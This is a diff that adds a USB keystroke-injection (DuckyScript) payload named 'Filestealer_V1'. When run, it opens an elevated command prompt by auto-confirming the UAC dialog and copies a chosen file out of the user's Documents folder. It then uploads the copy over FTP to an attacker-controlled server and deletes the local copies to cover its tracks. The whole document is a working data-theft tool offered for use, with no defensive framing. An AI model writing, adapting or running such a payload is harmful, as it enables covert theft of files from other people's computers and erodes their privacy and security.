@@ -1,0 +1,68 @@
+REM ######## REDJ0ka ##########
+REM ##    Filestealer_V1     ##
+REM ## Admin privilges needed##
+
+REM Minimize all windows
+GUI d
+DELAY 1000
+REM Open cmd (as admin with UAC confirmation)
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+ALT j
+ENTER
+DELAY 1000
+REM Change Directory to users Path and copy files from userspace to new created folder
+STRING cd "C:\users"
+ENTER
+REM Create a Folder in C:\users
+STRING MD test
+ENTER
+STRING copy "C:\users\%USERNAME%\Documents\FILENAME HERE" "C:\users\test"
+ENTER
+STRING exit
+ENTER
+
+
+REM Upload file using FTP
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+STRING ftp
+ENTER
+STRING o
+ENTER
+STRING <your FTP Server IP> <your port>
+ENTER
+DELAY 5000
+STRING <your user>
+ENTER
+STRING <your password>
+ENTER
+DELAY 1000
+STRING mput "C:\users\test\*"
+ENTER
+REPEAT 1000
+DELAY 5000
+STRING quit
+ENTER
+STRING exit
+ENTER
+
+REM Delete local copies and exit
+GUI r
+DELAY 1000
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 1000
+ALT j
+ENTER
+DELAY 1000
+STRING del "C:\users\test"
+ENTER
+STRING j
+ENTER
